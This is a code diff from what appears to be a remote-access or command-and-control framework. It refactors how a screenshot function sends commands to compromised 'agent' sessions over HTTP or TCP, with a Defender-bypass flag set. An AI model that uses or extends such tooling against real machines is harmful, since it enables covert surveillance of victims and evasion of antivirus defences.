@@ -5,8 +5,13 @@ import subprocess
 import random
 from core import shell
 from core.session_handlers import session_manager
-from colorama import Fore, Style
 
+# Command Execution Imports
+from core.command_execution import http_command_execution as http_exec
+from core.command_execution import tcp_command_execution as tcp_exec
+
+# Colorama Settings
+from colorama import Fore, Style
 brightgreen = "\001" + Style.BRIGHT + Fore.GREEN + "\002"
 brightyellow = "\001" + Style.BRIGHT + Fore.YELLOW + "\002"
 brightred = "\001" + Style.BRIGHT + Fore.RED + "\002"
@@ -50,9 +55,9 @@ def screenshot(sid: str, local_path: str = None, op_id="console"):
 
     # invoke on agent
     if session.transport in ("http", "https"):
-        out_b64 = shell.run_command_http(sid, ps, op_id=op_id)
+        out_b64 = http_exec.run_command_http(sid, ps, op_id=op_id)
     else:
-        out_b64 = shell.run_command_tcp(sid, ps, timeout=2.0, defender_bypass=True, portscan_active=True, op_id=op_id)
+        out_b64 = tcp_exec.run_command_tcp(sid, ps, timeout=2.0, defender_bypass=True, portscan_active=True, op_id=op_id)
 
     if not out_b64:
         print(brightyellow + "[*] No output or command failed")
